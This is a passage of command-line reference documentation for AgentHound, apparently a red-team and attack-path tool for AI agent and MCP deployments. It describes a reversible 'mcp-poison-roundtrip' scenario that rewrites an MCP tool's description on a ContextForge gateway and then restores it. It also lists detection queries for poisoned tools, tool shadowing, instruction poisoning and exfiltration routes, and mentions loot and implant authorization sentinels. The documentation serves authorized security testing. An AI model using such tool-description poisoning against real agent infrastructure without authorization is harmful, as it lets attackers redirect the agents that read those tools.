Before any request, the runner trims surrounding whitespace once, validates an absolute HTTP(S) endpoint, and binds the untouched trimmed spelling to `ResolveMCPServerIdentity("http", input)`. The endpoint never enters the witness. Query bytes remain identity-significant: fixed known-sensitive decoded keys and values exactly equal to the supplied campaign credential are rejected as best-effort defense-in-depth; arbitrary other query bytes are accepted, but the entire query is always redacted from reports, evidence, witnesses, errors, and logs. This is not a universal query-secret detector. Credentials are forwarded only to the exact lowercased scheme + hostname + effective-port origin, including redirects. The MCP SDK's exact-endpoint close `DELETE` is bounded by the original absolute scenario deadline and counted as an outbound request; AgentHound does not apply a blanket HTTP-client timeout that would break long-lived SSE.

Each committed scenario emits the same bounded, versioned `RunReport` with fixed local steps, sanitized target references, report start/completion times, per-step RFC3339Nano start/end times, typed operation classes, an applicable sanitized evidence/witness fingerprint, opaque receipt references, and explicit actual outbound-request, mutation, and elapsed-time limits/usage. Reports never contain receipt paths or receipt/content hashes. Redirect/retry `RoundTrip` dispatches count as requests. Budget exhaustion is indeterminate/unsafe, never a valid negative.

**Authorization gate:** the first `campaign` invocation prompts for `AUTHORIZED` and writes `~/.agenthound/campaign-acknowledged`. When stdin is consumed by `--witness -`/`--credential-stdin`, acknowledge non-interactively with a pre-existing sentinel or `AGENTHOUND_CAMPAIGN_AUTHORIZED=AUTHORIZED`.

**Residual caveat:** the witness is a snapshot of a *published* prediction. If the graph changes between export and ingest, the server re-correlation rejects the stale/mismatched witness (no verified evidence) rather than upgrading a prediction that no longer holds. See [security.md](../operator/security.md).

The second scenario is **`mcp-poison-roundtrip`** — a STANDALONE ContextForge target-mutation validation. It reuses the provider-specific `mcp.poison` module (Poison + the conflict-aware, no-blind-write Revert) to prove the reversible mutation machinery works end to end against a real target:

1. generate and apply a benign run-specific marker (`mcp.poison` Poison, committed);
2. re-read the exact injected state and compare to the receipt — the **ORACLE** (did the mutation land?);
3. issue the conflict-aware revert;
4. re-read and confirm the original is restored — the **CLEANUP**.

The oracle and cleanup are reported **separately** and computed **independently**. A mutating run requires both campaign authorization and the distinct poison/destructive acknowledgement. `campaign_run_id` is allocated before mutator construction; each mutator receipt carries that run ID, a random opaque `receipt_id`, and a positive invocation-order `step_sequence`. A no-op (`original == injected`) writes neither target nor receipt and reports `mutation_not_applied` with cleanup `not_applicable`. Active cleanup selects the exact engagement+run across all stateful modules, rejects missing/duplicate sequence metadata, reverts in global descending sequence order under a bounded non-cancellable context, and fail-stops on the first conflict/indeterminate/failure. Forward elapsed/usage accounting is frozen before that separately timed cleanup starts. Receipts remain immutable after success or failure. The final `RunReport` is emitted before an unsafe/unconfirmed cleanup returns nonzero.

| Oracle | Cleanup | Meaning |
|--------|---------|---------|
| `mutation_verified` | `restored` | mutation landed; original restored (target clean) |
| `mutation_not_applied` | `not_applicable` | the write did not change the live state; no cleanup was required |
| `mutation_conflict` | (independent) | post-mutation state matched neither original nor injected content, indicating an intervening or unprovable writer; cleanup is classified separately |
| `mutation_verified` | `conflict` | mutation landed but a third party edited the target — revert refused (**receipt retained**) |
| `mutation_verified` | `indeterminate` | revert could not re-read the live state — never a blind write (**receipt retained**) |
| (any) | `failed` | restoration was attempted but its write failed, or the post-restore read did not confirm the original (**receipt retained**) |
| `indeterminate` | (any) | post-mutation re-read failed — mutation landing is unknowable |

```bash
# STANDALONE reversible-mutation validation (mutates then restores; not an attack).
# Optional same-origin override; required for cross-origin management.
export AGENTHOUND_CONTEXTFORGE_TOKEN='...'
agenthound campaign https://gateway.example/servers/<server-uuid>/mcp \
    --scenario mcp-poison-roundtrip --adapter contextforge \
    --target-id support-lookup \
    --engagement-id DC35-DEMO --commit
```

| Flag | Default | Description |
|------|---------|-------------|
| `--target-id` | (required) | MCP tool whose description is mutated then restored |
| `--adapter` | (required) | Management adapter; must be `contextforge` |
| `--management-url` | derived | Optional ContextForge deployment-root override; omit `/v1` because AgentHound appends it |

The scenario takes no witness, no campaign credential material, and no operator-supplied mutation text. The generated marker is deliberately inert and unique to the run. ContextForge and MCP credentials use the environment/config resolution described under `agenthound poison`; neither is accepted on the command line. It creates no graph edge or finding. `--commit` is still off by default (dry-run plans only). See [offensive-actions.md](../operator/offensive-actions.md#campaign-runner-verify-and-validate).

---

### `agenthound version`

Print version string and commit hash.

---

## Server: `agenthound-server`

### Persistent Flags

| Flag | Env | Default | Description |
|------|-----|---------|-------------|
| `--bind` | `AGENTHOUND_BIND` | `127.0.0.1:8080` | Bind address `host:port`. |
| `--neo4j-uri` | `AGENTHOUND_NEO4J_URI` | `bolt://localhost:7687` | Neo4j connection URI. |
| `--neo4j-user` | `AGENTHOUND_NEO4J_USER` | `neo4j` | Neo4j username. |
| `--neo4j-password` | `AGENTHOUND_NEO4J_PASSWORD` | `agenthound` | Neo4j password. |
| `--pg-uri` | `AGENTHOUND_PG_URI` | `postgres://agenthound:agenthound@localhost:5432/agenthound?sslmode=disable` | PostgreSQL URI. |
| `--host-id` | `AGENTHOUND_HOST_ID` | _(required for DB commands)_ | Exact collector host admitted by this database pair. |
| `--network-realm-id` | `AGENTHOUND_NETWORK_REALM_ID` | _(required for DB commands)_ | Exact private-network realm admitted by this database pair. |
| `--storage-pair-id` | `AGENTHOUND_STORAGE_PAIR_ID` | _(required for DB commands)_ | Canonical lowercase UUID permanently pairing these PostgreSQL and Neo4j volumes. |
| `--cors-origins` | `AGENTHOUND_CORS_ORIGINS` | `http://localhost:8080,http://127.0.0.1:8080` | Comma-separated CORS origins. |
| `--log-level` | `AGENTHOUND_LOG_LEVEL` | `info` | `debug`, `info`, `warn`, `error`. |

Priority: CLI flag > env var > default.

---

### `agenthound-server serve`

Start the API server, embedded React UI, and initialize databases.

```bash
agenthound-server serve
```

Before any schema mutation, reads immutable binding markers from both databases
and requires the configured host, realm, and storage-pair UUID to match. A
one-sided missing marker is repaired only when both stores are product-empty;
crossed pairs, legacy non-empty stores, future marker versions, and realm
mismatches fail closed. It then initializes Neo4j schema (constraints +
indexes) and PostgreSQL migrations on first start. Mutating HTTP endpoints are
gated by `OriginGuard` (Origin allowlist, configured via `--cors-origins`).
Graceful shutdown on SIGINT/SIGTERM (10s drain).

**No application-layer authentication.** Default loopback bind is the security boundary. Expose remotely only over VPN/SSH tunnel. The server logs a `WARN` if bound to a non-loopback address.

---

### `agenthound-server ingest`

Ingest collector JSON into the graph database.

```bash
agenthound-server ingest <file.json>
agenthound-server ingest -
```

Pipeline stages: admit the strict v3 artifact origin and reverify both storage
markers, validate/normalize supported values, deduplicate (MERGE by objectid),
batch write (1000 ops/txn), and post-process (composite edges + risk scores).

All three ingest entry points (CLI, `POST /api/v1/ingest`, UI drag-drop) run the same pipeline.

The CLI prints the pipeline outcome, projection status, and publication
revision. It exits successfully only when the ingest produced a complete,
published projection. If a required stage is partial or failed, or publication
is withheld, it exits non-zero and reports the first unhealthy required stage;
write-row counts remain visible for diagnosis.

#### Example

```bash
agenthound scan --output - | agenthound-server ingest -
ssh target 'agenthound scan --output -' | agenthound-server ingest -
```

---

### `agenthound-server query`

Query the graph database. Five mutually exclusive modes.

```bash
# Raw Cypher against the mutable live graph (admin/diagnostic use)
agenthound-server query "MATCH (n:MCPServer) RETURN n.name, n.transport"

# Pre-built query against a stable complete published projection
agenthound-server query --prebuilt agents-shell-access

# Findings from the current published snapshot, with triage state
agenthound-server query --findings [--severity critical] [--all-findings]

# Diff two scans' findings
agenthound-server query --diff scan_a,scan_b

# Directed security shortest path (default)
agenthound-server query --shortest-path --from AgentInstance:claude --to MCPResource:postgres://prod

# Explicit undirected topology path
agenthound-server query --shortest-path --path-mode topology --from MCPResource:postgres://prod --to AgentInstance:claude
```

#### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--prebuilt` | | Pre-built query ID. Runs only against a stable complete published projection. |
| `--findings` | `false` | List the current immutable published snapshot (suppressed hidden by default). |
| `--all-findings` | `false` | Include suppressed (`accepted-risk` / `false-positive`) findings in `--findings` / `--diff` output. |
| `--diff` | | Diff two scans' findings: `scanA,scanB`. Reports added / removed / unchanged. |
| `--severity` | | Filter findings: `critical`, `high`, `medium`, `low`. |
| `--shortest-path` | `false` | Find a bounded shortest path with the shared traversal engine. |
| `--from` | | Source node (`Kind:name`). |
| `--to` | | Target node (`Kind:name`). |
| `--path-mode` | `security` | `security` uses the directed security relationship policy; `topology` explicitly selects the undirected graph view. |
| `--format` | `table` | `table` or `json`. |
| `--fail-on` | | Exit 1 if findings at or above severity (CI gate). Always ignores suppressed findings, even with `--all-findings`. |

Positional raw Cypher is an explicit live/admin interface: it reads the mutable
graph directly and is not guarded by published scan/revision identity. In
contrast, `--prebuilt` fails closed when the published projection is absent,
updating, incomplete, or changes during the read. JSON output includes a
`projection` object with `scan_id` and `revision`; table output prints the same
identity before the rows.

#### Suppression semantics

Triage decisions (`accepted-risk`, `false-positive`) suppress a finding from the default `--findings` view and from the `added` set of `--diff`. `--all-findings` reveals them. `--fail-on` *always* evaluates against the non-suppressed set, so an accepted risk can never break CI regardless of `--all-findings`.

#### Pre-Built Query IDs

| ID | Category | Severity |
|----|----------|----------|
| `agents-shell-access` | Critical Paths | critical |
| `shortest-to-database` | Critical Paths | critical |
| `cross-protocol-paths` | Critical Paths | critical |
| `exfiltration-routes` | Critical Paths | critical |
| `credential-chain` | Critical Paths | critical |
| `litellm-credential-leak` | Critical Paths | critical |
| `unpinned-shell` | Combined | critical |
| `poisoned-tools` | Vulnerabilities | high |
| `tool-shadowing` | Vulnerabilities | high |
| `no-auth-servers` | Vulnerabilities | high |
| `no-auth-a2a` | Vulnerabilities | high |
| `tool-name-collision` | Vulnerabilities | high |
| `rug-pull` | Vulnerabilities | high |
| `instruction-poisoning` | Supply Chain | high |
| `high-entropy-secrets` | Supply Chain | high |
| `unpinned-packages` | Supply Chain | medium |
| `unsigned-cards` | Supply Chain | medium |
| `chokepoint-servers` | Chokepoints | medium |
| `chokepoint-tools` | Chokepoints | medium |

#### CI/CD Gate Example

```bash
agenthound-server query --findings --fail-on critical --format json
```

---

### `agenthound-server witness`

Export a stable, sanitized **witness** for a predicted credential-gated `CAN_REACH` finding so the collector-side `agenthound campaign` runner can verify it.

Witness v2 is exported only for HTTP-backed resources. It carries the explicit source `AgentInstance`, server/credential/resource IDs and concrete kinds, credential `value_hash` + `merge_key`, resource identity input, predicted edge kind, topology-normalization version, and the actual ordered current `CAN_REACH.evidence_node_ids` with one normalized concrete kind per node. Its positive publication revision is provenance only, not an equality gate. The unkeyed fingerprint detects inconsistency but is not a signature or authorization proof. It contains no clear endpoint, Neo4j relationship ID, arbitrary node property, or secret.

```bash
agenthound-server witness --finding <finding-id> > witness.json
agenthound-server witness --finding <finding-id> --output witness.json
```

| Flag | Default | Description |
|------|---------|-------------|
| `--finding` | (required) | Finding ID (16-char fingerprint) to export a witness for |
| `--output` | `-` | Write the witness JSON to this path, or `-` for stdout |

Also exposed over the API: `GET /api/v1/analysis/findings/{id}/witness`. See [api.md](api.md#get-apiv1analysisfindingsidwitness).

---

### `agenthound-server version`

Print version string and commit hash.

---

## Environment Variable Summary

| Variable | Binary | Default |
|----------|--------|---------|
| `AGENTHOUND_OUTPUT` | collector | `./scan-<scan_id>.json` |
| `AGENTHOUND_LOG_LEVEL` | both | `info` |
| `AGENTHOUND_CONCURRENCY` | collector | `5` |
| `AGENTHOUND_QUIET` | collector | (unset) |
| `AGENTHOUND_LOG_JSON` | collector | (unset) |
| `AGENTHOUND_RULES_BUNDLE` | collector | (unset) |
| `AGENTHOUND_RULES_DIR` | collector | `~/.agenthound/rules/` |
| `AGENTHOUND_CAMPAIGN_CREDENTIAL` | collector | (unset) — out-of-band credential material for `campaign` |
| `AGENTHOUND_CAMPAIGN_AUTHORIZED` | collector | (unset) — non-interactive `campaign` authorization ack |
| `AGENTHOUND_BIND` | server | `127.0.0.1:8080` |
| `AGENTHOUND_NEO4J_URI` | server | `bolt://localhost:7687` |
| `AGENTHOUND_NEO4J_USER` | server | `neo4j` |
| `AGENTHOUND_NEO4J_PASSWORD` | server | `agenthound` |
| `AGENTHOUND_PG_URI` | server | `postgres://agenthound:agenthound@localhost:5432/agenthound?sslmode=disable` |
| `AGENTHOUND_CORS_ORIGINS` | server | `http://localhost:8080,http://127.0.0.1:8080` |

---

## State Directories

| Path | Purpose |
|------|---------|
| `~/.agenthound/loot-acknowledged` | Loot authorization sentinel. |
| `~/.agenthound/poison-acknowledged` | Poison/implant authorization sentinel. |
| `~/.agenthound/state/<module-id>/<engagement-id>.json` | Poison/implant receipts (audit trail + revert source). |
| `~/.agenthound/rules/` | Custom detection rules directory. |
